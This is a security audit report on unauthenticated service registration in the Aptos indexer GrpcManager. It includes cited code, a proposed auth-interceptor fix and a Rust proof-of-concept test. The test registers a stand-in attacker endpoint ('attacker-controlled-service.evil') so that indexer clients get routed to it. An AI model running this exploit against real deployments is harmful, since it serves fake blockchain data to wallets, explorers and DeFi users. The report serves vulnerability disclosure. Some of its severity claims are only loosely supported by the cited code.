# Audit Report

## Title
Unauthenticated Service Registration in GrpcManager Allows Malicious Data Service Injection

## Summary
The `GrpcManagerServer` exposes unprotected gRPC endpoints that allow any network-accessible attacker to register malicious data services and serve fake blockchain data to indexers, analytics tools, and other downstream consumers without authentication or authorization checks. [1](#0-0) [2](#0-1) 

## Finding Description

The `GrpcManagerServer` is instantiated without any authentication interceptor, exposing three critical endpoints without access control: [3](#0-2) 

The `heartbeat()` endpoint accepts service registration requests from any caller without validation: [4](#0-3) 

When a heartbeat is received, the `MetadataManager` automatically registers unknown services using `.or_insert()`, creating new entries for any address provided: [5](#0-4) [6](#0-5) 

The `get_data_service_for_request()` method then routes legitimate clients to these registered services, potentially directing them to attacker-controlled endpoints: [7](#0-6) 

**Attack Path:**
1. Attacker sends unauthenticated `HeartbeatRequest` with malicious service address and fabricated `LiveDataServiceInfo` or `HistoricalDataServiceInfo`
2. `GrpcManagerService::heartbeat()` accepts the request without authentication checks
3. `MetadataManager::handle_heartbeat()` automatically registers the malicious service via `.or_insert()`
4. Legitimate indexers call `get_data_service_for_request()` to discover available data services
5. Selection algorithm picks the attacker's service based on reported load metrics (which the attacker controls)
6. Indexers connect to malicious service and receive fake blockchain data
7. Compromised indexers propagate false information to downstream applications (wallets, dApps, explorers)

Additionally, the `get_transactions()` endpoint serves cached transaction data without authentication: [8](#0-7) 

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:

1. **API crashes**: Registry poisoning with non-existent services causes routing failures and service degradation when legitimate clients cannot retrieve blockchain data

2. **Significant protocol violations**: The indexer coordination protocol is fundamentally violated by allowing unauthorized service registration, compromising the integrity guarantees of the entire indexer infrastructure

3. **Ecosystem-wide data integrity compromise**: While not directly affecting consensus, this vulnerability undermines trust in blockchain data served to all external consumers including:
   - DeFi protocols making financial decisions based on chain state
   - Wallets displaying incorrect balances or transaction history
   - Block explorers serving false information to users
   - Analytics platforms producing incorrect metrics

4. **Credential theft potential**: If downstream clients authenticate to the malicious service using API keys or tokens, attackers can harvest these credentials

The configuration shows no authentication fields are available: [9](#0-8) 

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires only:
- Network connectivity to the GrpcManager service (typically exposed on the network for legitimate data services)
- Ability to construct and send gRPC requests (standard tooling)
- No special permissions, credentials, or insider access
- No rate limiting or validation prevents repeated abuse

The connection manager code shows legitimate services send heartbeats every second: [10](#0-9) 

An attacker can trivially mimic this behavior to maintain persistent registration.

## Recommendation

**Immediate Fix**: Implement authentication and authorization for the GrpcManager service using tonic interceptors.

The code already provides the `with_interceptor` method but it's not used: [11](#0-10) 

Authentication constants are already defined: [12](#0-11) 

**Recommended Implementation:**

```rust
// In ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs

// Add authentication interceptor
pub struct AuthInterceptor {
    allowed_tokens: HashSet<String>,
}

impl tonic::service::Interceptor for AuthInterceptor {
    fn call(&mut self, mut request: tonic::Request<()>) -> Result<tonic::Request<()>, tonic::Status> {
        let token = request.metadata().get(GRPC_AUTH_TOKEN_HEADER)
            .and_then(|v| v.to_str().ok())
            .ok_or_else(|| tonic::Status::unauthenticated("Missing auth token"))?;
        
        if !self.allowed_tokens.contains(token) {
            return Err(tonic::Status::permission_denied("Invalid auth token"));
        }
        
        Ok(request)
    }
}

// Update service creation in start() method:
let service = GrpcManagerServer::new(GrpcManagerService::new(
    self.chain_id,
    self.metadata_manager.clone(),
    self.data_manager.clone(),
))
.with_interceptor(AuthInterceptor {
    allowed_tokens: config.allowed_service_tokens.clone(),
})
.send_compressed(CompressionEncoding::Zstd)
// ... rest of configuration
```

**Additional Hardening:**
1. Add `allowed_service_tokens` configuration field to `IndexerGrpcManagerConfig`
2. Implement mutual TLS for service-to-service communication
3. Add IP allowlisting for known legitimate data service addresses
4. Implement service registration approval workflow for production deployments

## Proof of Concept

```rust
// PoC: Malicious service registration exploit
// Place in: ecosystem/indexer-grpc/indexer-grpc-manager/tests/exploit_poc.rs

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
    StreamInfo,
};
use tonic::transport::Channel;

#[tokio::test]
async fn test_unauthenticated_malicious_service_registration() {
    // Setup: Assume GrpcManager is running at localhost:50051
    let channel = Channel::from_static("http://localhost:50051")
        .connect()
        .await
        .expect("Failed to connect");
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Attacker sends heartbeat with malicious service address
    let malicious_address = "http://attacker-controlled-service.evil:8080".to_string();
    
    let heartbeat_request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address.clone()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1, // Mainnet chain ID
                timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                known_latest_version: Some(1000000),
                stream_info: Some(StreamInfo {
                    active_streams: vec![], // Report zero load to increase selection probability
                }),
                min_servable_version: Some(0),
            })),
        }),
    };
    
    // THIS SHOULD FAIL but currently succeeds due to missing authentication
    let response = client.heartbeat(heartbeat_request).await;
    
    assert!(response.is_ok(), "Malicious service registration succeeded without authentication!");
    
    println!("EXPLOIT SUCCESSFUL: Registered malicious service at {}", malicious_address);
    println!("Legitimate clients will now be routed to attacker-controlled endpoint");
    
    // Verify registration by requesting service routing
    let routing_request = aptos_protos::indexer::v1::GetDataServiceForRequestRequest {
        user_request: Some(aptos_protos::indexer::v1::get_data_service_for_request_request::UserRequest {
            starting_version: Some(100),
        }),
    };
    
    let routing_response = client.get_data_service_for_request(routing_request).await.unwrap();
    println!("Routed client to: {}", routing_response.into_inner().data_service_address);
}
```

**Notes**

While this vulnerability does not directly compromise consensus or validator operations, it represents a **significant protocol violation** in the indexer infrastructure that can lead to widespread data integrity issues affecting the entire Aptos ecosystem. The indexer services are critical infrastructure that numerous applications, wallets, and DeFi protocols depend on for accurate blockchain data. A compromise of this system can lead to incorrect financial decisions, fraudulent transactions, and loss of user trust.

The lack of authentication is particularly concerning given that authentication infrastructure already exists in the codebase (as seen in the constants and data service implementations), but was not applied to the GrpcManager service.

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.tonic.rs (L528-536)
```rust
        pub fn with_interceptor<F>(
            inner: T,
            interceptor: F,
        ) -> InterceptedService<Self, F>
        where
            F: tonic::service::Interceptor,
        {
            InterceptedService::new(Self::new(inner), interceptor)
        }
```

**File:** protos/rust/src/pb/aptos.indexer.v1.tonic.rs (L623-623)
```rust
                        let res = grpc.unary(method, req).await;
```

**File:** protos/rust/src/pb/aptos.indexer.v1.tonic.rs (L668-668)
```rust
                        let res = grpc.unary(method, req).await;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L92-100)
```rust
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L31-42)
```rust
pub struct IndexerGrpcManagerConfig {
    pub(crate) chain_id: u64,
    pub(crate) service_config: ServiceConfig,
    #[serde(default = "default_cache_config")]
    pub(crate) cache_config: CacheConfig,
    pub(crate) file_store_config: IndexerGrpcFileStoreConfig,
    pub(crate) self_advertised_address: GrpcAddress,
    pub(crate) grpc_manager_addresses: Vec<GrpcAddress>,
    pub(crate) fullnode_addresses: Vec<GrpcAddress>,
    pub(crate) is_master: bool,
    pub(crate) allow_fn_fallback: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L145-166)
```rust
    pub(crate) async fn start(&self) {
        loop {
            for entry in self.grpc_manager_connections.iter() {
                let address = entry.key();
                let mut retries = 0;
                loop {
                    let result = self.heartbeat(address).await;
                    if result.is_ok() {
                        break;
                    }
                    retries += 1;
                    if retries > MAX_HEARTBEAT_RETRIES {
                        warn!("Failed to send heartbeat to GrpcManager at {address}, last error: {result:?}.");
                        break;
                    }
                }
                continue;
            }

            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L12-17)
```rust
// GRPC request metadata key for the token ID.
pub const GRPC_AUTH_TOKEN_HEADER: &str = "x-aptos-data-authorization";
// GRPC request metadata key for the request name. This is used to identify the
// data destination.
pub const GRPC_REQUEST_NAME_HEADER: &str = "x-aptos-request-name";
pub const GRPC_API_GATEWAY_API_KEY_HEADER: &str = "authorization";
```
